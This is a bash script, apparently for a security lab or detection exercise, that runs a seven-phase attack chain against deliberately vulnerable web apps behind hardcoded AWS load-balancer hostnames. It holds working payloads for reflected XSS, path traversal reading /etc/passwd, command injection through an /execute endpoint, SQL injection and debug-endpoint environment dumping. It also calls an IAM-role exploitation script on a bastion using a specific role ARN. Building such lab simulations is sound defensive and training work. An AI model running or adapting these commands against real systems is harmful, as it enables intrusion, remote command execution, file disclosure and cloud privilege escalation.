#!/bin/bash

# Master attack script to run all exploitations sequentially from local machine
# Uses LoadBalancer URLs for direct internet access
# Runs attacks gradually to simulate realistic attack progression

set -euo pipefail

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         Complete Attack Chain - From Local Machine           ║"
echo "║                  (Lab Only)                                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

# Get LoadBalancer URLs from bastion or use defaults
BASTION_IP="${BASTION_IP:-}"
if [ -n "$BASTION_IP" ]; then
    echo -e "${YELLOW}Getting LoadBalancer URLs from bastion...${NC}"
    WEB_URL=$(ssh -p 22222 -o StrictHostKeyChecking=no ubuntu@$BASTION_IP \
        "kubectl get svc -n vulnerable-apps vulnerable-web-app -o jsonpath='{.status.loadBalancer.ingress[0].hostname}'" 2>/dev/null || echo "")
    API_URL=$(ssh -p 22222 -o StrictHostKeyChecking=no ubuntu@$BASTION_IP \
        "kubectl get svc -n vulnerable-apps vulnerable-api -o jsonpath='{.status.loadBalancer.ingress[0].hostname}'" 2>/dev/null || echo "")
    LEGACY_URL=$(ssh -p 22222 -o StrictHostKeyChecking=no ubuntu@$BASTION_IP \
        "kubectl get svc -n vulnerable-apps vulnerable-legacy-app -o jsonpath='{.status.loadBalancer.ingress[0].hostname}'" 2>/dev/null || echo "")
    BLOG_URL=$(ssh -p 22222 -o StrictHostKeyChecking=no ubuntu@$BASTION_IP \
        "kubectl get svc -n vulnerable-apps blog-app -o jsonpath='{.status.loadBalancer.ingress[0].hostname}'" 2>/dev/null || echo "")
    ECOM_URL=$(ssh -p 22222 -o StrictHostKeyChecking=no ubuntu@$BASTION_IP \
        "kubectl get svc -n vulnerable-apps ecommerce-app -o jsonpath='{.status.loadBalancer.ingress[0].hostname}'" 2>/dev/null || echo "")
fi

# Use provided URLs or defaults (ensure http:// prefix)
if [ -n "$WEB_URL" ] && [[ ! "$WEB_URL" =~ ^http ]]; then
    WEB_URL="http://${WEB_URL}:3000"
fi
if [ -n "$API_URL" ] && [[ ! "$API_URL" =~ ^http ]]; then
    API_URL="http://${API_URL}:5000"
fi
if [ -n "$LEGACY_URL" ] && [[ ! "$LEGACY_URL" =~ ^http ]]; then
    LEGACY_URL="http://${LEGACY_URL}:8080"
fi
if [ -n "$BLOG_URL" ] && [[ ! "$BLOG_URL" =~ ^http ]]; then
    BLOG_URL="http://${BLOG_URL}:8081"
fi
if [ -n "$ECOM_URL" ] && [[ ! "$ECOM_URL" =~ ^http ]]; then
    ECOM_URL="http://${ECOM_URL}:8082"
fi

WEB_URL="${WEB_URL:-http://af27f94ff0dd5475abf27381998b12fc-2136651876.eu-central-1.elb.amazonaws.com:3000}"
API_URL="${API_URL:-http://a98f78674a87c490fb96ee76715e9518-288516544.eu-central-1.elb.amazonaws.com:5000}"
LEGACY_URL="${LEGACY_URL:-http://a88e2ebd02375423d87211a4aaef867d-356569397.eu-central-1.elb.amazonaws.com:8080}"
BLOG_URL="${BLOG_URL:-http://a8e30c27f440045a190fb51d1fd10062-1007446821.eu-central-1.elb.amazonaws.com:8081}"
ECOM_URL="${ECOM_URL:-http://ac9c51258fda44a149fb400ec24e8d02-1766768.eu-central-1.elb.amazonaws.com:8082}"

echo -e "${CYAN}Target URLs:${NC}"
echo -e "  Web App:     ${WEB_URL}"
echo -e "  API:         ${API_URL}"
echo -e "  Legacy App:  ${LEGACY_URL}"
echo -e "  Blog App:    ${BLOG_URL}"
echo -e "  E-commerce:  ${ECOM_URL}"
echo ""

# Function to wait between attacks
wait_between() {
    local seconds=${1:-3}
    echo -e "${YELLOW}  Waiting ${seconds}s before next attack...${NC}"
    sleep $seconds
}

# Phase 1: Reconnaissance
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Phase 1: Reconnaissance & Initial Access                  ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${YELLOW}[1.1] Testing service accessibility...${NC}"
for url in "$WEB_URL" "$API_URL" "$LEGACY_URL"; do
    if curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url" | grep -q "200"; then
        echo -e "${GREEN}  ✓ $(echo $url | cut -d'/' -f3) is accessible${NC}"
    else
        echo -e "${RED}  ✗ $(echo $url | cut -d'/' -f3) is not accessible${NC}"
    fi
done
wait_between 2

echo -e "\n${YELLOW}[1.2] Information gathering - vulnerable-web-app${NC}"
curl -s "$WEB_URL/debug" | jq -r '.env | keys[]' 2>/dev/null | head -5 | while read key; do
    echo -e "${CYAN}    Found env var: $key${NC}"
done || echo -e "${YELLOW}    Debug endpoint accessible${NC}"
wait_between 2

# Phase 2: Web Application Attacks
echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Phase 2: Web Application Exploitation                       ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${YELLOW}[2.1] XSS Attack${NC}"
XSS_PAYLOAD="<script>alert('XSS')</script>"
RESPONSE=$(curl -s "$WEB_URL/search?q=$XSS_PAYLOAD")
if echo "$RESPONSE" | grep -q "script"; then
    echo -e "${GREEN}  ✓ XSS vulnerability confirmed${NC}"
    echo -e "${CYAN}    Payload reflected in response${NC}"
else
    echo -e "${RED}  ✗ XSS not exploitable${NC}"
fi
wait_between 3

echo -e "\n${YELLOW}[2.2] Path Traversal Attack${NC}"
TRAVERSAL_PAYLOAD="../../../etc/passwd"
RESPONSE=$(curl -s "$WEB_URL/file?name=$TRAVERSAL_PAYLOAD")
if echo "$RESPONSE" | grep -q "root:"; then
    echo -e "${GREEN}  ✓ Path Traversal successful${NC}"
    echo -e "${CYAN}    Retrieved: /etc/passwd (first 3 lines)${NC}"
    echo "$RESPONSE" | head -3 | sed 's/^/      /'
else
    echo -e "${YELLOW}  ⚠ Path Traversal may be blocked or file not found${NC}"
fi
wait_between 3

echo -e "\n${YELLOW}[2.3] Command Injection Attack${NC}"
CMD_PAYLOAD='{"command":"id"}'
RESPONSE=$(curl -s -X POST "$WEB_URL/execute" \
    -H "Content-Type: application/json" \
    -d "$CMD_PAYLOAD")
if echo "$RESPONSE" | grep -q "uid="; then
    echo -e "${GREEN}  ✓ Command Injection successful${NC}"
    echo -e "${CYAN}    Executed: id${NC}"
    echo "$RESPONSE" | head -1 | sed 's/^/      /'
else
    echo -e "${YELLOW}  ⚠ Command Injection may be blocked${NC}"
fi
wait_between 3

echo -e "\n${YELLOW}[2.4] SQL Injection Attempt${NC}"
SQL_PAYLOAD="1' OR '1'='1"
RESPONSE=$(curl -s "$WEB_URL/users?id=$SQL_PAYLOAD")
if echo "$RESPONSE" | grep -qi "executing\|error\|syntax"; then
    echo -e "${GREEN}  ✓ SQL Injection vulnerability detected${NC}"
    echo -e "${CYAN}    Payload: $SQL_PAYLOAD${NC}"
else
    echo -e "${YELLOW}  ⚠ SQL Injection may not be exploitable via this endpoint${NC}"
fi
wait_between 2

# Phase 3: API Exploitation
echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Phase 3: API Exploitation                                    ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${YELLOW}[3.1] API Health Check${NC}"
HEALTH=$(curl -s "$API_URL/health")
if echo "$HEALTH" | grep -q "healthy"; then
    echo -e "${GREEN}  ✓ API is healthy${NC}"
    echo "$HEALTH" | jq '.' 2>/dev/null || echo "$HEALTH"
else
    echo -e "${RED}  ✗ API health check failed${NC}"
fi
wait_between 2

echo -e "\n${YELLOW}[3.2] API Endpoint Enumeration${NC}"
for endpoint in "/api/users" "/api/products" "/"; do
    RESPONSE=$(curl -s "$API_URL$endpoint" 2>/dev/null)
    if [ -n "$RESPONSE" ] && [ "$(echo "$RESPONSE" | wc -c)" -gt 10 ]; then
        echo -e "${GREEN}  ✓ Endpoint accessible: $endpoint${NC}"
    fi
done
wait_between 2

# Phase 4: Legacy Application
echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Phase 4: Legacy Application Access                          ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${YELLOW}[4.1] Legacy App Access${NC}"
RESPONSE=$(curl -s "$LEGACY_URL/")
if echo "$RESPONSE" | grep -qi "vulnerable\|legacy"; then
    echo -e "${GREEN}  ✓ Legacy application accessible${NC}"
    echo -e "${CYAN}    Title: $(echo "$RESPONSE" | grep -o '<title>.*</title>' | head -1)${NC}"
else
    echo -e "${RED}  ✗ Legacy application not accessible${NC}"
fi
wait_between 2

# Phase 5: Additional Applications
echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Phase 5: Additional Applications                            ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${YELLOW}[5.1] Blog App Access${NC}"
RESPONSE=$(curl -s "$BLOG_URL/" 2>/dev/null)
if [ -n "$RESPONSE" ] && echo "$RESPONSE" | grep -q "html"; then
    echo -e "${GREEN}  ✓ Blog application accessible${NC}"
else
    echo -e "${YELLOW}  ⚠ Blog application may not be accessible${NC}"
fi
wait_between 2

echo -e "\n${YELLOW}[5.2] E-commerce App Access${NC}"
RESPONSE=$(curl -s "$ECOM_URL/" 2>/dev/null)
if [ -n "$RESPONSE" ] && echo "$RESPONSE" | grep -q "html"; then
    echo -e "${GREEN}  ✓ E-commerce application accessible${NC}"
else
    echo -e "${YELLOW}  ⚠ E-commerce application may not be accessible${NC}"
fi
wait_between 2

# Phase 6: Advanced Exploitation
echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Phase 6: Advanced Exploitation                              ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${YELLOW}[6.1] Multiple Command Injections${NC}"
for cmd in "whoami" "uname -a" "pwd"; do
    RESPONSE=$(curl -s -X POST "$WEB_URL/execute" \
        -H "Content-Type: application/json" \
        -d "{\"command\":\"$cmd\"}" 2>/dev/null)
    if [ -n "$RESPONSE" ]; then
        echo -e "${GREEN}  ✓ Command executed: $cmd${NC}"
        echo "$RESPONSE" | head -1 | sed 's/^/      /'
    fi
    sleep 1
done
wait_between 3

echo -e "\n${YELLOW}[6.2] Information Disclosure - Full Environment${NC}"
ENV_DATA=$(curl -s "$WEB_URL/debug" 2>/dev/null)
if [ -n "$ENV_DATA" ]; then
    echo -e "${GREEN}  ✓ Environment data retrieved${NC}"
    echo -e "${CYAN}    Found $(echo "$ENV_DATA" | jq '.env | length' 2>/dev/null || echo "multiple") environment variables${NC}"
    echo -e "${CYAN}    Kubernetes service discovery data exposed${NC}"
fi
wait_between 2

# Phase 7: IAM Role Exploitation (via bastion)
echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  Phase 7: Cloud Privilege Escalation (via Bastion)          ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"

if [ -n "$BASTION_IP" ]; then
    echo -e "${YELLOW}[7.1] Exploiting IAM Role from Bastion...${NC}"
    ssh -p 22222 -o StrictHostKeyChecking=no ubuntu@$BASTION_IP \
        "cd ~/exploitation && export EXPLOITATION_ROLE_ARN='arn:aws:iam::203918880757:role/exploitation-admin-role' && timeout 90 ./exploit-iam-role.sh 2>&1 | tail -20" || \
        echo -e "${YELLOW}  ⚠ IAM exploitation may need manual execution${NC}"
    wait_between 3
else
    echo -e "${YELLOW}  ⚠ BASTION_IP not set, skipping IAM exploitation${NC}"
    echo -e "${CYAN}    Set BASTION_IP environment variable to enable${NC}"
fi

# Summary
echo -e "\n${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║           Attack Chain Completed                               ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${GREEN}Summary of attacks executed:${NC}"
echo -e "  ✓ Phase 1: Reconnaissance & Information Gathering"
echo -e "  ✓ Phase 2: Web Application Exploitation (XSS, Path Traversal, Command Injection, SQL Injection)"
echo -e "  ✓ Phase 3: API Exploitation"
echo -e "  ✓ Phase 4: Legacy Application Access"
echo -e "  ✓ Phase 5: Additional Applications (Blog, E-commerce)"
echo -e "  ✓ Phase 6: Advanced Exploitation"
if [ -n "$BASTION_IP" ]; then
    echo -e "  ✓ Phase 7: Cloud Privilege Escalation (IAM Role)"
fi

echo -e "\n${YELLOW}Target URLs used:${NC}"
echo -e "  Web App:     $WEB_URL"
echo -e "  API:         $API_URL"
echo -e "  Legacy App:  $LEGACY_URL"

echo -e "\n${CYAN}All attacks executed gradually to simulate realistic attack progression${NC}"

